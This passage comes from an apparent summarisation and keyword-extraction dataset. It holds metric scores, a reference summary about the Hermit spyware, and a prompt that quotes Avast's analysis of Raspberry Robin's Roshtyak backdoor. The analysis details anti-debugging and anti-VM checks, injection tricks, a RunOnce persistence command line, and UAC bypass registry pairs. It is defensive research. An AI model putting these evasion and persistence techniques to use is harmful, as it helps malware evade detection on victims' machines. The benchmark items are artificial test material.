and owners17/17 ", "generated_text": "the report; Hermit; Android surveillanceware; the government; Kazakhstan; April 2022; protests; the government; protests; protests; international competition; the spyware; modules; call logs; contact info; screenshots; calls; additional features; a rooted device; audio; video; data; contacts; location; SMS messages; a legitimate source; the malware; a device; telecommunications companies; Android; the malware; devices; the device; Russian; Armenian; part; the malware; the malware; the government; the first time; this threat.", "ref_text": "<START-1>The report analyzes an Android spyware named Hermit that was used to target victims in Kazakhstan and elsewhere. Hermit is developed by Italian surveillance vendor RCS Lab and a front company called Tykelab. Hermit is modular malware that downloads additional capability modules from its command and control server after initial infection. It can record audio, intercept notifications, steal data like contacts and photos, and more. Samples were found impersonating smartphone manufacturers to trick users into installing Hermit. The malware displays legitimate websites as it starts malicious background activities. In April 2022, Hermit was found targeting Kazakhstan in the wake of anti-government protests being suppressed. The command and control IP tied back to an ISP in the capital. Prior infections were seen in Syria and Italy. The report examines RCS Lab's controversial global spyware dealings with authoritarian regimes. Technical analysis reveals Hermit's advanced capabilities like device exploitation, encrypted communications, configurable parameters, and steps to evade detection and analysis. The report concludes that spyware like Hermit poses a powerful threat, but can be defeated through awareness, application vetting, device hygiene, and dedicated mobile security solutions. In summary, the report provides an in-depth profile of the sophisticated Hermit spyware, its developers, infection tactics, and use in targeted surveillance operations globally. <END-1>", "t5/keyword/hint_hit_precision": 0.2682926829268293, "t5/word/hint_hit_recall": 0.06763285024154589, "gpt3/lexical/rouge_rouge1": 0.5068119891008175, "gpt3/lexical/rouge_rouge2": 0.10410958904109589, "gpt3/lexical/rouge_rougeL": 0.25613079019073565, "gpt3/lexical/rouge_rougeLsum": 0.25613079019073565, "gpt3_generated_text": ["In April 2022, Lookout Threat Lab researchers uncovered enterprise-grade Android surveillanceware named Hermit being deployed by the government of Kazakhstan. The spyware, likely developed by Italian companies RCS Lab S.p.A and Tykelab Srl, was detected four months after nation-wide protests. Hermit is a modular surveillanceware that hides its malicious capabilities in packages downloaded after deployment, allowing it to exploit rooted devices, record audio and calls, and collect data such as call logs, contacts, photos, device location, and SMS messages. The spyware is distributed via SMS messages impersonating legitimate sources, tricking users by displaying legitimate webpages while carrying out malicious activities in the background. The Kazakhstan deployment of Hermit was linked to a C2 server administered by an ISP in Nur-Sultan. Prior to the Kazakhstan samples, references to the spyware were found in northeastern Syria. This marks the first time a current customer of RCS Lab\u2019s mobile malware has been identified."]}, {"split_name": "val", "sample_id": "val_60", "prompt_text": "Extract the keywords: decoded.avast.io /janvojtesek/raspberry-robins-roshtyak-a-little-lesson-in-trickery/ Raspberry Robin\u2019s Roshtyak: A Little Lesson in Trickery \u22ee 9/22/2022by Jan Vojt\u011b\u0161ek September 22, 2022 46 min readThere are various tricks malware authors use to make malware analysts\u2019 jobs more difficult. These tricks include obfuscation techniques to complicate reverse engineering, anti-sandbox techniques to evade sandboxes, packing to bypass static detection, and more. Countless deceptive tricks used by various malware strains in-the-wild have been documented over the years. However, few of these tricks are implemented in a typical piece of malware, despite the many available tricks.The subject of this blog post, a backdoor we dubbed Roshtyak, is not your typical piece of malware. Roshtyak is full of tricks. Some are well-known, and some we have never seen before. From a technical perspective, the lengths Roshtyak takes to protect itself are extremely interesting. Roshtyak belongs to one of the best-protected malware strains we have ever seen. We hope by publishing our research and analysis of the malware and its protection tricks we will help fellow researchers recognize and respond to similar tricks, and harden their analysis environments, making them more resistant to the evasion techniques described.Roshtyak is the DLL backdoor used by Raspberry Robin, a worm spreading through infected removable drives. Raspberry Robin is extremely prevalent. We protected over 550K of our users from the worm this year. Due to its high prevalence, it should be no surprise that we aren\u2019t the only ones taking note of Raspberry Robin.Red Canary\u2019s researchers published the first analysis of Raspberry Robin in May 2022. In June, Symantec published a report describing a mining/clipboard hijacking operation, which reportedly made the cybercriminals at least $1.7 million. Symantec did not link the malicious operation to Raspberry Robin. Nevertheless, we assess with high confidence that what they analyzed was Raspberry Robin. This assessment is based on C&C overlaps, strong malware similarity, and coinfections observed in our telemetry. Cybereason, Microsoft, and Cisco published further reports in July/August 2022. Microsoft reported that Raspberry Robin infections led to DEV-0243 (a.k.a Evil Corp) pre-ransomware behavior. We could not confirm this connection using our telemetry. Still, we find it reasonable to believe that the miner payload is not the only way Raspberry Robin infections are being monetized. Other recent reports also hint at a possible connection between Raspberry Robin and Evil Corp.A map showing the number of users Avast protected from Raspberry RobinThere are many unknowns about Raspberry Robin, despite so many published reports. What are the ultimate objectives behind the malware? Who is responsible for Raspberry Robin? How did it become so prevalent?1/16Unfortunately, we do not have answers to all these questions. However, we can answer an important question we saw asked multiple times: What functionality is hidden inside the heavily obfuscated DLL (or Roshtyak as we call it)? To answer this question, we fully reverse engineered a Roshtyak sample, and present our analysis results in this blog post. OverviewRoshtyak is packed in as many as 14 protective layers, each heavily obfuscated and serving a specific purpose. Some artifacts suggest the layers were originally PE files but were transformed into custom encrypted structures that only the previous layers know how to decrypt and load. Numerous anti-debugger, anti-sandbox, anti-VM, and anti- emulator checks are sprinkled throughout the layers. If one of these checks successfully detects an analysis environment, one of four actions are taken.1. The malware calls TerminateProcess on itself to avoid exhibiting any further malicious behavior and to keepthe subsequent layers encrypted.2. Roshtyak crashes on purpose. This has the same effect as terminating itself, but it might not be immediatelyclear if the crash was intentional or because of a bug thanks to Roshtyak\u2019s obfuscated nature.3. The malware enters an infinite loop on purpose. Since the loop itself is located in obfuscated code and spansthousands of instructions, it might be hard to determine if the loop is doing something useful or not.4. The most interesting case is when the malware reacts to a successful check by unpacking and loading a fake payload. This happens in the eighth layer, which is loaded with dozens of anti-analysis checks. The result of each of these checks is used to modify the value of a global variable. There are two payloads encrypted in the data section of the eighth layer: the real ninth layer and a fake payload. The real ninth layer will get decrypted only if the global variable matches the expected value after all the checks have been performed. If at least one check succeeded in detecting an analysis environment, the global variable\u2019s value will differ from the expected value, causing Roshtyak to unpack and execute the fake payload instead.Roshtyak\u2019s obfuscation causes even relatively simple functions to grow into large proportions. This necessitates some custom deobfuscation tooling if one wants to reverse engineer it within a reasonable timeframe.The fake payload is a BroAssist (a.k.a BrowserAssistant) adware sample. We believe this fake payload was intended to mislead malware analysts into thinking the sample is less interesting than it really is. When a reverse engineer focuses on quickly unpacking a sample, it might look like the whole sample is \u201cjust\u201d an obfuscated piece of adware (and a very old one at that), which could cause the analyst to lose interest in digging deeper. And indeed, it turns out that these fake payload shenanigans can be very effective. As can be seen on the screenshot below, it fooled at least one researcher, who misattributed the Raspberry Robin worm, because of the fake BrowserAssistant payload.2/16A security researcher misattributing Raspberry Robin because of the fake payload. This is not to pick on anyone, we just want to show make a mistake like this given Roshtyak\u2019s trickery and complexity.The Bag of TricksFor the sake of keeping this blog post (sort of) short and to the point, let\u2019s get straight into detailing some of the more interesting evasion techniques employed by Roshtyak.Segment registersEarly in the execution, Roshtyak prefers to use checks that do not require calling any imported functions. If one of these checks is successful, the sample can quietly exit without generating any suspicious API calls. Below is an example where Roshtyak checks the behavior of the gs segment register. The check is designed to be stealthy and the surrounding garbage instructions make it easy to overlook.A stealthy detection of single- stepping. Only the underscored instructions are useful.The first idea behind this check is to detect single-stepping. Before the above snippet, the value of cx was initialized to 2. After the pop ecx instruction, Roshtyak checks if cx is still equal to 2. This would be the expected behavior because this value should propagate through the stack and the gs register under normal circumstances. However, a single step event would reset the value of the gs selector, which would result in a different value getting popped into ecx at the end.But there is more to this check. As a side effect of the two push/pop pairs above, the value of gs is temporarily changed to 2. After this check, Roshtyak enters a loop, counting the number of iterations until the value of gs is no longer 2. The gs selector is also reset after a thread context switch, so the loop essentially counts the number of iterations until a context switch happens. Roshtyak repeats this procedure multiple times, averages out the result, and checks that it belongs to a sensible range for a bare metal execution environment. If the sample runs under a hypervisor or in an emulator, the average number of iterations might fall outside of this range, which allows Roshtyak to detect undesirable execution environments.3/16Roshtyak also checks that the value of the cs segment register is either 0x1b or 0x23. Here, 0x1b is the expected value when running on native x86 Windows, while 0x23 is the expected value under WoW64.APC injection through a random ntdll gadgetRoshtyak performs some of its functionality from separate processes. For example, when it communicates with its C&C server, it spawns a new innocent-looking process like regsvr32.exe. Using shared sections, it injects its comms module into the address space of the new process. The injected module is executed via APC injection, using NtQueueApcThreadEx.Interestingly, the ApcRoutine argument (which marks the target routine to be scheduled for execution) does not point to the entry point of the injected module. Instead, it points to a seemingly random address inside ntdll. Taking a closer look, we see this address was not chosen randomly but that Roshtyak scanned the code section of ntdll for pop r32; ret gadgets (excluding pop esp, because pivoting the stack would be undesirable) and picked one at random to use as the ApcRoutine.A random pop r32; ret gadget used as the entry point for APC injectionLooking at the calling convention for the ApcRoutine reveals what\u2019s going on. The pop instruction makes the stack pointer point to the SystemArgument1 parameter of NtQueueApcThreadEx and so the ret instruction effectively jumps to wherever SystemArgument1 is pointing. This means that by abusing this gadget, Roshtyak can treat SystemArgument1 as the entry point for the purpose of APC injection. This obfuscates the control flow and makes the NtQueueApcThreadEx call look more legitimate. If someone hooks this function and inspects the ApcRoutine argument, the fact that it is pointing into the ntdll code section might be enough to convince them that the call is not malicious.Checking read/write performance on write-combined memoryIn this next check, Roshtyak allocates a large memory buffer with the PAGE_WRITECOMBINE flag. This flag is supposed to modify cache behavior to optimize sequential write performance (at the expense of read performance and possibly memory ordering). Roshtyak uses this to detect if it\u2019s running on a physical machine. It conducts an experiment where it first writes to the allocated buffer and then reads from the allocated buffer, all while measuring the read/write performance using a separate thread as a counter. This experiment is repeated 32 times and the check is passed only if write performance was at least six times higher than read performance most of the times. If the check fails, Roshtyak intentionally selects a wrong RC4 key, which results in failing to properly decrypt the next layer.Hiding shellcode from plain sightThe injected shellcode is interestingly hidden, too. When Roshtyak prepares for code injection, it first creates a large section and maps it into the current process as PAGE_READWRITE. Then, it fills the section with random data and places the shellcode at a random offset within the random data. Since the shellcode is just a relatively small loader followed by random-looking packed data, the whole section looks like random data.4/16A histogram of the bytes inside the shared section. Note that it looks almost random, the most suspicious sign is the slight overrepreseThe section is then unmapped from the current process and mapped into the target process, where it is executed using the above-described APC injection technique. The random data was added in an attempt to conceal the existence of the shellcode. Judging only from the memory dump of the target process, it might look like the section is full of random data and does not contain any valid executable code. Even if one suspects actual valid code somewhere in the middle of the section, it will not be easy to find its exact location.The start of the shellcode within the shared section. It might be hard to pinpoint the exact start address because it unconventionally starts on an odd bt instruction.Ret2Kernel32Roshtyak makes a point of cleaning up after itself. Whenever a certain string or piece of memory is no longer needed, Roshtyak wipes and/or frees it in an attempt to destroy as much evidence as possible. The same holds for Roshtyak\u2019s layers. Whenever one layer finishes its job, it frees itself before passing execution onto the next layer. However, the layer cannot just simply free itself directly. The whole process would crash if it called VirtualFree on the region of memory it\u2019s currently executing from.Roshtyak, therefore, frees the layer through a ROP chain executed during layer transitions to avoid this problem. When a layer is about to exit, it constructs a ROP chain on the stack and returns into it. An example of such a ROP chain can be seen below. This chain starts by returning into VirtualFree and UnmapViewOfFile to release the previous layer\u2019s memory. Then, it returns into the next layer. The return address from the next layer is set to RtlExitUserThread, to safeguard execution.5/16A simple ROP chain consisting of VirtualFree -> UnmapViewOfFile -> next layer -> RtlExitUserThreadMulDiv bugMulDiv is a function exported by kernel32.dll, which takes three signed 32-bit integers as arguments. It multiplies the first two arguments, divides the multiplication result by the third argument, and returns the final result rounded to the nearest integer. While this might seem like a simple enough function, there\u2019s an ancient sign extension bug in Microsoft\u2019s implementation. This bug is sort of considered a feature now and might never get fixed.Roshtyak is aware of the bug and tests for its presence by calling MulDiv(1, 0x80000000, 0x80000000). On real Windows machines, this triggers the bug and MulDiv erroneously returns 2, even though the correct return value should be 1, because (1 * -2147483648) / -2147483648 = 1. This allows Roshtyak to detect emulators that do not replicate the bug. For example, this successfully detects Wine, which, funnily enough, contains a different bug, which makes the above call return 0.Tampering with return addresses stored on the stackThere are also tricks designed to obfuscate function calls. As shown in the previous section, Roshtyak likes to call functions using the ret instruction. This next trick is similar in that it also manipulates the stack so a ret instruction can be used to jump to the desired address.To achieve this, Roshtyak scans the current thread\u2019s stack for pointers into the code section of one of the previous layers (unlike the other layers, this one was not freed using the ROP chain technique). It replaces all these pointers with the address it wants to call. Then it lets the code return multiple times until a ret instruction encounters one of the hijacked pointers, redirecting the execution to the desired address.Exception-based checksAdditionally, Roshtyak contains checks that set up a custom vectored exception handler and intentionally trigger various exceptions to ensure they all get handled as expected.Roshtyak sets up a vectored exception handler using RtlAddVectoredExceptionHandler. This handler contains custom handlers for selected exception codes. A top-level exception handler is also registered using SetUnhandledExceptionFilter. This handler should not be called in the targeted execution environments (none of the intentionally triggered exceptions should fall through the vectored exception handler). So this top-level handler just contains a single call to TerminateProcess. Interestingly, Roshtyak also uses ZwSetInformationProcess to set SEM_FAILCRITICALERRORS using the ProcessDefaultHardErrorMode class. This ensures that even if the exception somehow is passed all the way to the default exception handler, Windows would not show the standard error message box, which could alert the victim that something suspicious is going on.When everything is set up, Roshtyak begins generating exceptions. The first exception is generated by a popf instruction, directly followed by a cpuid instruction (shown below). The value popped by the popf instruction was crafted to set the trap flag, which should, in turn, raise a single-step exception. On a physical machine, the exception would trigger right after the cpuid instruction. Then, the custom vectored exception handler would take over and move the instruction pointer away from the C7 B2 opcodes, which mark an invalid instruction. However, under many hypervisors, the single-step exception would not be raised. This is because the cpuid instruction forces a VM exit, which might delay the effect of the trap flag. If that is the case, the processor will raise an illegal instruction exception when trying to execute the invalid opcodes. If the vectored exception handler encounters such an exception, it knows that it is running under a hypervisor. A variation of this technique is described thoroughly in a blog post by Palo Alto Networks. Please refer to it for more details.6/16The exception-based check using popf and cpuid to detect hypervisorsAnother exception is generated using the two-byte int 3 instruction (CD 03). This instruction is followed by garbage opcodes. The int 3 here raises a breakpoint exception, which is handled by the vectored exception handler. The vectored exception handler doesn\u2019t really do anything to handle the exception, which is interesting. This is because by default, when Windows handles the two-byte int 3 instruction, it will leave the instruction pointer in between the two instruction bytes, pointing to the 03 byte. When disassembled from this 03 byte, the garbage opcodes suddenly start making sense. We believe this is a check against some overeager debuggers, which could \u201cfix\u201d the instruction pointer to point after the 03 byte.Moreover, the vectored exception handler checks the thread\u2019s CONTEXT and makes sure that registers Dr0 through Dr3 are empty. If they are not, the process is being debugged using hardware breakpoints. While this check is relatively common in malware, the CONTEXT is usually obtained using a call to a function like GetThreadContext. Here, the malware authors took advantage of CONTEXT being passed as an argument to the exception handler, so they did not need to call any additional API functions.Large executable mappingsThis next check is interesting mostly because we are not sure what it\u2019s really supposed to check (in other words, we\u2019d be happy to hear your theories!). It starts with Roshtyak creating a large PAGE_EXECUTE_READWRITE mapping of size 0x386F000. Then it maps this mapping nine times into its own address space. After this, it memsets the mapping to 0x42 (opcode for inc edx), except for the last six bytes, which are filled with four inc ecx instructions and jmp dword ptr [ecx] (see below). Next, it puts the nine base addresses of the mapped views into an array, followed by an address of a single ret instruction. Finally, it points ecx into this array and calls the first mapped view, which results in all the mapped views being called sequentially until the final ret instruction. After the return, Roshtyak validates that edx got incremented exactly 0x1FBE6FCA times (9 * (0x386F000 - 6)).The end of the large mapped section. The jmp dword ptr [ecx] instruction is supposed to jump to the start of the next mapped view.Our best guess is that this is yet another anti-emulator check. For example, in some emulators, mapped sections might not be fully implemented, so the instructions written into one instance of the mapped view might not propagate to the other eight instances. Another theory is the check could be done to request large amounts of memory that emulators might fail to provide. After all, the combined size of all the views is almost half of the standard 32-bit user mode address space.Detecting process suspensionThis trick abuses an undocumented thread creation flag in NtCreateThreadEx to detect when Roshtyak\u2019s main process gets externally suspended (which could mean that a debugger got attached). This flag essentially allows a thread to keep running even when PsSuspendProcess gets called. This is coupled with another trick abusing the fact that the thread suspend counter is a signed 8-bit value, which means that it maxes out at 127. Roshtyak spawns two threads, one of which keeps suspending the other one until the suspend counter limit is reached. After this, the first thread keeps periodically suspending the other one and checking if the call to NtSuspendThread keeps failing with STATUS_SUSPEND_COUNT_EXCEEDED. If it does not, the thread must have been externally suspended and resumed (which would leave the suspend counter at 126, so the next call to NtSuspendThread would succeed). Not getting this error code would be suspicious enough for Roshtyak to quit using TerminateProcess. This entire technique is described in more detail in a blog post by Secret Club. We believe that\u2019s where the authors of Roshtyak7/16got this trick from. It\u2019s also worth mentioning Roshtyak uses this technique only on Windows builds 18323 (19H1) and later because the undocumented thread creation flag was not implemented on prior builds.Indirect registry writesRoshtyak performs many suspicious registry operations, for example, setting up the RunOnce key for persistence. Since modifications to such keys are likely to be monitored, Roshtyak attempts to circumvent the monitoring. It first generates a random registry key name and temporarily renames the RunOnce key to the random name using ZwRenameKey. Once renamed, Roshtyak adds a new persistence entry to the temporary key before finally renaming it back to RunOnce. This method of writing to the registry can be easily detected, but it might bypass some simple hooking-based monitoring methods.Similarly, there are multiple methods Roshtyak uses to delete files. Aside from the apparent call to NtDeleteFile, Roshtyak is able to effectively delete a file by setting FileDispositionInformation or FileRenameInformation in a call to ZwSetInformationFile. However, unlike the registry modification method, this doesn\u2019t seem to be implemented in order to evade detection. Instead, Roshtyak will try these alternative methods if the initial call to NtDelete file fails.Checking VBAWarningsThe VBAWarnings registry value controls how Microsoft Office behaves when a user opens a document containing embedded VBA macros. If this value is 1 (meaning \u201cEnable all macros\u201d), macros are executed by default, even without the need for any user interaction. This is a common setting for sandboxes, which are designed to detonate maldocs automatically. On the other hand, this setting is uncommon for regular users, who generally don\u2019t go around changing random settings to make themselves more vulnerable (at least most of them don\u2019t). Roshtyak therefore uses this check to differentiate between sandboxes and regular users and refuses to run further if the value of VBAWarnings is 1. Interestingly, this means that users, who for whatever reason have lowered their security this way, are immune to Roshtyak.Command line wipingRoshtyak\u2019s core is executed with very suspicious command lines, such as RUNDLL32.EXE SHELL32.DLL,ShellExec_RunDLL REGSVR32.EXE -U /s \"C:\\Users\\ <REDACTED>\\AppData\\Local\\Temp\\dpcw.etl.\". These command lines don\u2019t look particularly legitimate, so Roshtyak attempts to hide them during execution. It does this by wiping command line information collected from various sources. It starts by calling GetCommandLineA and GetCommandLineW and wiping both of the returned strings. Then it attempts to wipe the string pointed to by PEB->ProcessParameters->CommandLine (even if this points to a string that has already been wiped). Since Roshtyak is often running under WoW64, it also calls NtWow64QueryInformationProcess64 to obtain a pointer to PEB64 to wipe ProcessParameters- >CommandLine obtained by traversing this \u201csecond\u201d PEB. While the wiping of the command lines was probably meant to make Roshtyak look more legitimate, the complete absence of any command line is also highly unusual. This was noticed by the Red Canary researchers in their blog post, where they proposed a detection method based on these suspiciously empty command lines.Roshtyak\u2019s core process, as shown by Process Explorer. Note the suspiciously empty command line.Additional tricksAside from the techniques described so far, Roshtyak uses many less sophisticated tricks that are commonly found in other malware as well. These include:Hiding threads using ThreadHideFromDebugger (and verifying that the threads really got hidden using NtQueryInformationThread) Patching DbgBreakPoint in ntdll Detecting user inactivity using GetLastInputInfo8/16Checking fields from PEB (BeingDebugged, NtGlobalFlag) Checking fields from KUSER_SHARED_DATA (KdDebuggerEnabled, ActiveProcessorCount, NumberOfPhysicalPages) Checking the names of all running processes (some are compared by hash, some by patterns, and some by character distribution) Hashing the names of all loaded modules and checking them against a hardcoded blacklist Verifying the main process name is not too long and doesn\u2019t match known names used in sandboxes Using the cpuid instruction to check hypervisor information and the processor brand Using poorly documented COM interfaces Checking the username and computername against a hardcoded blacklist Checking for the presence of known sandbox decoy files Checking MAC addresses of own adapters against a hardcoded blacklist Checking MAC addresses from the ARP table (using GetBestRoute to populate it and GetIpNetTable to inspect it) Calling ZwQueryInformationProcess with ProcessDebugObjectHandle, ProcessDebugFlags, and ProcessDebugPort Checking DeviceId of display devices (using EnumDisplayDevices) Checking ProductId of \\\\.\\PhysicalDrive0 (using IOCTL_STORAGE_QUERY_PROPERTY) Checking for virtual hard disks (using NtQuerySystemInformation with SystemVhdBootInformation) Checking the raw SMBIOS firmware table (using NtQuerySystemInformation with SystemFirmwareTableInformation) Setting up Defender exclusions (both for paths and processes) Removing IFEO registry keys related to process names used by the malwareObfuscationWe\u2019ve shown many anti-analysis tricks that are designed to prevent Roshtyak from detonating in undesirable execution environments. These tricks alone would be easy to patch or bypass. What makes analyzing Roshtyak especially lethal is the combination of all these tricks with heavy obfuscation and multiple layers of packing. This makes it very difficult to study the anti-analysis tricks statically and figure out how to pass all the checks in order to get Roshtyak to unpack itself. Furthermore, even the main payload received the same obfuscation, which means that statically analyzing Roshtyak\u2019s core functionality also requires a great deal of deobfuscation.In the rest of this section, we\u2019ll go through the main obfuscation techniques used by Roshtyak.A random code snippet from Roshtyak. As can be seen, the obfuscation makes the raw output of the Hex- Rays decompiler practically incomprehensible.Control flow flatteningControl flow flattening is one of the most noticeable obfuscation techniques employed by Roshtyak. It is implemented in an unusual way, giving the control flow graphs of Roshtyak\u2019s functions a unique look (see below). The goal of control flow flattening is to obscure control flow relations between individual code blocks.9/16Control flow is directed by a 32-bit control variable, which tracks the execution state, identifying the code block to be executed. This control variable is initialized at the start of each function to refer to the starting code block (which is frequently a nop block). The control variable is then modified at the end of each code block to identify the next code block that should be executed. The modification is performed using some arithmetic instructions, such as add, sub, or xor.There is a dispatcher using the control variable to route execution into the correct code block. This dispatcher is made up of if/else blocks that are circularly linked into a loop. Each dispatcher block takes the control variable and masks it using arithmetic instructions to check if it should route execution into the code block that it is guarding. What\u2019s interesting here is there are multiple points of entry from the code blocks into the dispatcher loop, giving the control flow graphs the jagged \u201csawblade\u201d look in IDA.Branching is performed using a special code block containing an imul instruction. It relies on the previous block to compute a branch flag. This branch flag is multiplied using the imul instruction with a random constant, and the result is added, subbed, or xored to the new control variable. This means that after the branch block, the control variable will identify one of the two possible succeeding code blocks, depending on the value that was computed for the branch flag.Control flow graph of a function obfuscated using control flow flatteningFunction activation keysRoshtyak\u2019s obfuscated functions expect an extra argument, which we call an activation key. This activation key is used to decrypt all local constants, strings, variables, etc. If a function is called with a wrong activation key, the decryption results in garbage plaintext, which will most likely cause Roshtyak to get stuck in an infinite loop inside the control flow dispatcher. This is because all constants used by the dispatcher (the initial value of the control variable, the masks used by the dispatcher guards, and the constants used to jump to the next code block) are encrypted with the activation key. Without the correct activation key, the dispatcher simply does not know how to dispatch.Reverse engineering a function is practically impossible without knowing the correct activation key. All strings, buffers, and local variables/constants remain encrypted, all cross-references are lost, and worse, there is no control flow information. Only individual code blocks remain, with no way to know how they relate to each other.Each obfuscated function has to be called from somewhere, which means the code calling the function has to supply the correct activation key. However, obtaining the activation key is not that easy. First, call targets are also encrypted with activation keys, so it\u2019s impossible to find where a function is called from without knowing the right activation keys. Second, even the supplied activation key is encrypted with the activation key of the calling function. And that10/16activation key got encrypted with the activation key of the next calling function. And so on, recursively, all the way until the entry point function.This brings us to how to deobfuscate the mess. The activation key of the entry point function must be there in plaintext. Using this activation key, it is possible to decrypt the call targets and activation keys of functions that are called directly from this entry point function. Applying this method recursively allows us to reconstruct the full call graph along with the activation keys of all the functions. The only exceptions would be functions that were never called and were left in by the compiler. These functions will probably remain a mystery, but since the sample does not use them, they are not that important from a malware analyst\u2019s point of view.Variable maskingSome variables are not stored in plaintext form but are masked using one or more arithmetic instructions. This means that if Roshtyak is not actively using a variable, it keeps the variable\u2019s value in an obfuscated form. Whenever Roshtyak needs to use the variable, it has to first unmask it before it can use it. Conversely, after Roshtyak uses the variable, it converts it back into the masked form. This masking-based obfuscation method slightly complicates tracking variables during debugging and makes it harder to search memory for a known variable value.Loop transformationsRoshtyak is creative with some loop conditions. Instead of writing a loop like for (int i = 0; i < 1690; i++), it transforms the loop into e.g. for (int32_t i = 0x06AB91EE; i != 0x70826068; i = i * -0x509FFFF + 0xEC891BB1). While both loops will execute exactly 1690 times, the second one is much harder to read. At first glance, it is not clear how many iterations the second loop executes (and if it even terminates). Tracking the number of loop iterations during debugging is also much harder in the second case.PackingAs mentioned, Roshtyak\u2019s core is hidden behind multiple layers of packing. While all the layers look like they were originally compiled into PE files, all but the strictly necessary data (entry point, sections, imports, and relocations) were stripped away. Furthermore, Roshtyak supports two custom formats for storing the stripped PE file information, and the layers take turns on what format they use. Additionally, parts of the custom formats are encrypted, sometimes using keys generated based on the results of various anti-analysis checks.This makes it difficult to unpack Roshtyak\u2019s layers statically into a standalone PE file. First, one would have to reverse engineer the custom formats and figure out how to decrypt the encrypted parts. Then, one would have to reconstruct the PE header, the sections, the section headers, and the import table (the relocation table doesn\u2019t need to be reconstructed since relocations can just be turned off). While this is all perfectly doable (and can be simplified using libraries like LIEF), it might take a significant amount of time. Adding to this that the layers are sometimes interdependent, it might be easier to just analyze Roshtyak dynamically in memory.A section header in one of the custom PE-like file formats: raw_size corresponds to SizeOfRawData, raw_size + virtual_padding_size is effectively VirtualSize. There is no VirtualAddress or PointerToRawData equivalent because the sections are loaded sequentially.Other obfuscation techniquesIn addition to the above-described techniques, Roshtyak also uses other obfuscation techniques, including:Junk instruction insertion Import hashing Frequent memory wiping Mixed boolean-arithmetic obfuscation Redundant threading Heavy polymorphismCore Functionality11/16Now that we\u2019ve described how Roshtyak protects itself, it might be interesting to also go over what it actually does. Roshtyak\u2019s DLL is relatively large, over a megabyte, but its functionality is surprisingly simple once you eliminate all the obfuscation. Its main purpose is to download further payloads to execute. In addition, it does the usual evil malware stuff, namely establishing persistence, escalating privileges, lateral movement, and exfiltrating information about the victim.PersistenceRoshtyak first generates a random file name in %SystemRoot%\\Temp and moves its DLL image there. The generated file name consists of two to eight random lowercase characters concatenated with a random extension chosen from a hardcoded list. The PRNG used to generate this file name is seeded with the volume serial number of C:\\. The sample we analyzed hardcoded seven extensions (.log, .tmp, .loc, .dmp, .out, .ttf, and .etl). We observed other extensions being used in other samples, suggesting this list is somewhat dynamic. With a small probability, Roshtyak will also use a randomly generated extension. Once fully constructed, the full path to the Roshtyak DLL might look like e.g. C:\\Windows\\Temp\\wcdp.etl.After the DLL image is moved to the new filesystem path, Roshtyak stomps its Modified timestamp to the current system time. It then proceeds to set up a RunOnce(Ex) registry key to actually establish persistence. The registry entry is created using the previously described indirect registry write technique. The command inserted into the key might look as follows: RUNDLL32.EXE SHELL32.DLL,ShellExec_RunDLL REGSVR32.EXE -U /s \"C:\\Windows\\Temp\\wcdp.etl.\"There are a couple of things to note here. First, regsvr32 doesn\u2019t care about the extensions of the DLLs it loads, allowing Roshtyak to hide under an innocent-looking extension such as .log. Second, the /s parameter puts regsvr32 into silent mode. Without it, regsvr32 would complain that it did not find an export named DllUnregisterServer. Finally, notice the trailing period character at the end of the path. This period is removed during path normalization, so it practically has no effect on the command. We are not exactly sure what the author\u2019s original intention behind including this period character is. It looks like it could have been designed to trick some anti- malware software into not being able to connect the persistence entry with the payload on the filesystem.By default, Roshtyak uses the HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce key for persistence. However, under some circumstances (such as when it detects that Kaspersky is running by checking for a process named avp.exe) the key HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx will be used instead. The RunOnceEx key is capable of loading a DLL, so when using this key, Roshtyak specifies shell32.dll directly, omitting the use rundll32.A RunOnceEx persistence entry established by RoshtyakPrivilege escalationRoshtyak uses both UAC bypasses and regular EoP exploits in an attempt to elevate its privileges. Unlike many other pieces of malware, which just blindly execute whatever UAC bypasses/exploits the authors could find, Roshtyak makes efforts to figure out if the privilege escalation method is even likely to be successful. This was probably implemented to lower the chances of detection due to the unnecessary usage of incompatible bypasses/exploits. For UAC bypasses, this involves checking the ConsentPromptBehaviorAdmin and ConsentPromptBehaviorUser registry keys. For EoP exploits, this is about checking the Windows build number and patch level.Besides checking the ConsentPromptBehavior(Admin|User) keys, Roshtyak performs other sanity checks to ensure that it should proceed with the UAC bypass. Namely, it checks for admin privileges using CheckTokenMembership with the SID S-1-5-32-544 (DOMAIN_ALIAS_RID_ADMINS). It also inspects the value of the DbgElevationEnabled flag in KUSER_SHARED_DATA.SharedDataFlags. This is an undocumented flag that is set if UAC is enabled. Finally, there are AV checks for BitDefender (detected by the module atcuf32.dll), Kaspersky (process avp.exe), and our own Avast/AVG (module aswhook.dll). If one of these AVs is detected, Roshtyak avoids selected UAC bypass techniques, presumably the ones that might result in detection.As for the actual UAC bypasses, there are two main methods implemented. The first is an implementation of the aptly named ucmDccwCOM method from UACMe. Interestingly when this method is executed, Roshtyak temporarily masquerades its process as explorer.exe by overwriting FullDllName and BaseDllName in the _LDR_MODULE structure corresponding to the main executable module. The payload launched by this method is a12/16randomly named LNK file, dropped into %TEMP% using the IShellLink COM interface. This LNK file is designed to relaunch the Roshtyak DLL, through LOLBins such as advpack or register-cimprovider.The second method is more of a UAC bypass framework than a specific bypass method, because multiple UAC bypass methods follow the same simple pattern: first registering some specific shell open command and then executing an autoelevating Windows binary (which internally triggers the shell open command). For instance, a UAC bypass might be accomplished by writing a payload command to HKCU\\Software\\Classes\\ms- settings\\shell\\open\\command and then executing fodhelper.exe from %windir%\\system32. Basically, the same bypass can be achieved by substituting the pair ms-settings/fodhelper.exe with other pairs, such as mscfile/eventvwr.exe. Roshtyak uses the following six pairs to bypass UAC:Executable Launcher.SystemSettings slui.exeLet\u2019s now look at the kernel exploits (CVE-2020-1054 and CVE-2021-1732) Roshtyak uses to escalate privileges. As is often the case in Roshtyak, these exploits are stored encrypted and are only decrypted on demand. Interestingly, once decrypted, the exploits turn out to be regular PE files with completely valid headers (unlike the other layers in Roshtyak, which are either in shellcode form or stored in a custom stripped PE format). Moreover, the exploits lack the obfuscation given to the rest of Roshtyak, so their code is immediately decompilable, and only some basic string encryption is used. We don\u2019t know why the attackers left these exploits so exposed, but it might be due to the difference in bitness. While Roshtyak itself is x86 code (most of the time running under WoW64), the exploits are x64 (which makes sense considering they exploit vulnerabilities in 64-bit code). It could be that the obfuscation tools used by Roshtyak\u2019s authors were designed to work on x86 and are not portable to x64.Snippet from Roshtyak\u2019s exploit for CVE-2020-1054, scanning through IsMenu to find the offset to HMValidateHandle.To execute the 